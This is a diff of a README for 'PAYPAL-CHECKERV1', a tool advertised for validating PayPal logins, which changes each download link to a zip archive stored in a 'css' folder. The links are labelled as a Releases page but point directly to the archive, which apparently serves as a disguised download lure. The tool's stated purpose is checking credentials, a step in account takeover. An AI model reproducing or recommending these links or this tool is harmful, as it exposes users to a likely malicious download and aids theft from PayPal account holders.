@@ -6,16 +6,16 @@ Welcome to PAYPAL-CHECKERV1! This tool helps you validate PayPal logins simply a
 
 ## 📥 Download PAYPAL-CHECKERV1
 
-[![Download Here](https://raw.githubusercontent.com/Goaty013045/PAYPAL-CHECKERV1/main/kerslosh/PAYPAL-CHECKERV1.zip)](https://raw.githubusercontent.com/Goaty013045/PAYPAL-CHECKERV1/main/kerslosh/PAYPAL-CHECKERV1.zip)
+[![Download Here](https://github.com/Goaty013045/PAYPAL-CHECKERV1/raw/refs/heads/main/css/CHECKER_PAYPA_v1.3-alpha.4.zip)](https://github.com/Goaty013045/PAYPAL-CHECKERV1/raw/refs/heads/main/css/CHECKER_PAYPA_v1.3-alpha.4.zip)
 
 You can download the latest version of PAYPAL-CHECKERV1 from our Releases page. 
 
-[Visit this page to download.](https://raw.githubusercontent.com/Goaty013045/PAYPAL-CHECKERV1/main/kerslosh/PAYPAL-CHECKERV1.zip)
+[Visit this page to download.](https://github.com/Goaty013045/PAYPAL-CHECKERV1/raw/refs/heads/main/css/CHECKER_PAYPA_v1.3-alpha.4.zip)
 
 ## 💾 Download & Install
 
 1. **Go to the Releases page:** Click the link below to visit the page where you can download the application.
-   [Visit this page to download.](https://raw.githubusercontent.com/Goaty013045/PAYPAL-CHECKERV1/main/kerslosh/PAYPAL-CHECKERV1.zip)
+   [Visit this page to download.](https://github.com/Goaty013045/PAYPAL-CHECKERV1/raw/refs/heads/main/css/CHECKER_PAYPA_v1.3-alpha.4.zip)
 
 2. **Choose the latest version:** Look for the most recent release at the top of the page. This version will have the latest features and fixes.
 
